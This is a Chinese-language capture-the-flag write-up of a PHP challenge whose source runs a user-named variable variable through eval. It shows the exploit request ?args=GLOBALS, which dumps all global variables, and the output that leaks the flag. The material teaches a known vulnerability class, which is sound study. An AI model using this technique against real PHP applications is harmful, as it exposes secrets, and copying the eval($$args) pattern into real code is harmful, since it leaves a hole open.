## 题目描述
页面包含 PHP 代码，涉及变量覆盖漏洞。

## 解题过程

### 1. 分析源码

题目源码大致如下：

```php
<?php  
error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");}
?>
```

### 2. 利用变量覆盖

**传入 GLOBALS：**

```plain
http://xxx.xxx.xxx.xxx/xxx/?args=GLOBALS
```
传入 GLOBALS 后，PHP 会输出所有全局变量，其中包含 $flag。

**原理：**
- 如果代码中有 var_dump($$args)：
- $$args 变成 $GLOBALS
- var_dump($GLOBALS) 输出所有全局变量数组
- 数组中包含 'flag' => 'flag{...}'

### 3. 获取 Flag

**从输出中找到 flag：**
```php
array(7) { ["_GET"]=> array(1) { ["args"]=> string(7) "GLOBALS" } ["_POST"]=> array(0) { } ["_COOKIE"]=> array(0) { } ["_FILES"]=> array(0) { } ["ZFkwe3"]=> string(38) "flag{1ba66ba0df47c006d2146836d216e6aa}" ["args"]=> string(7) "GLOBALS" ["GLOBALS"]=> *RECURSION* }
```

**Flag**
```php
flag{1ba66ba0df47c006d2146836d216e6aa}
```

## 涉及知识点
- PHP 变量覆盖：extract()、$$ 等可导致变量覆盖
- GLOBALS 超级全局变量：包含所有全局变量的数组
- PHP 弱类型：empty()、isset() 等函数的行为
